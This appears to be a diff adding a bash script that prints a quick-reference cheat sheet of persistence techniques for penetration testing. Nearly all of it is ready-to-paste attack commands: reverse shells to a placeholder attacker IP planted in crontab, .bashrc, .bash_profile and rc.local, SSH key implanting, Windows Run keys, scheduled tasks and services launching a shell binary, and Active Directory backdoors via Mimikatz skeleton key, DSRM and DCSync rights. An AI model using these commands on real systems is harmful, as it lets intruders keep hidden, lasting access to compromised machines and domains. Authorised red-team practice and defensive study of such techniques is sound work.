@@ -1,0 +1,65 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── PERSISTENCE TECHNIQUES ────────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Linux ────────────────────────────────────────────${NC}"
+printf "\n"
+echo -e "  Note: SSH authorized keys:"
+echo -e "  ${GREEN}mkdir -p ~/.ssh && chmod 700 ~/.ssh${NC}"
+echo -e "  ${GREEN}echo 'ssh-rsa AAAA...your_public_key...' >> ~/.ssh/authorized_keys${NC}"
+echo -e "  ${GREEN}chmod 600 ~/.ssh/authorized_keys${NC}"
+printf "\n"
+echo -e "  Note: Crontab reverse shell:"
+echo -e "  ${GREEN}echo '* * * * * bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1' | crontab -${NC}"
+echo -e "  ${GREEN}crontab -l${NC}                                       # verify"
+printf "\n"
+echo -e "  Note: bash_profile hook:"
+echo -e "  ${GREEN}echo 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1' >> ~/.bash_profile${NC}"
+echo -e "  ${GREEN}echo 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1' >> ~/.bashrc${NC}"
+printf "\n"
+echo -e "  Note: /etc/rc.local (root):"
+echo -e "  ${GREEN}echo 'bash -c \"bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1 &\"' >> /etc/rc.local${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Windows — Registry Run Keys ──────────────────────${NC}"
+echo -e "  ${GREEN}reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /t REG_SZ /d 'C:\shell.exe'${NC}"
+echo -e "  ${GREEN}reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /t REG_SZ /d 'C:\shell.exe'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Windows — Scheduled Task ─────────────────────────${NC}"
+echo -e "  ${GREEN}schtasks /create /tn updater /tr 'C:\shell.exe' /sc onlogon /ru SYSTEM${NC}"
+echo -e "  ${GREEN}schtasks /create /tn updater /tr 'C:\shell.exe' /sc minute /mo 5 /ru SYSTEM${NC}"
+echo -e "  ${GREEN}schtasks /query /tn updater${NC}                      # verify"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Windows — Service ────────────────────────────────${NC}"
+echo -e "  ${GREEN}sc create updater binPath= \"C:\\shell.exe\" start= auto${NC}"
+echo -e "  ${GREEN}sc start updater${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── AD — Domain Persistence ──────────────────────────${NC}"
+printf "\n"
+echo -e "  Note: Skeleton Key — all accounts accept 'mimikatz' as password:"
+echo -e "  ${GREEN}privilege::debug${NC}"
+echo -e "  ${GREEN}misc::skeleton${NC}"
+printf "\n"
+echo -e "  Note: DSRM backdoor — DC local admin password:"
+echo -e "  ${GREEN}New-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\' -Name 'DsrmAdminLogonBehavior' -Value 2 -PropertyType DWORD${NC}"
+printf "\n"
+echo -e "  Note: DCSync rights for backdoor user:"
+echo -e "  ${GREEN}Add-ObjectACL -TargetDistinguishedName 'dc=corp,dc=com' -PrincipalSamAccountName BackdoorUser -Rights DCSync${NC}"
+printf "\n"
+echo -e "  Note: Golden ticket — krbtgt hash -> permanent access:"
+echo -e "  ${BLUE}See: qhelp golden${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
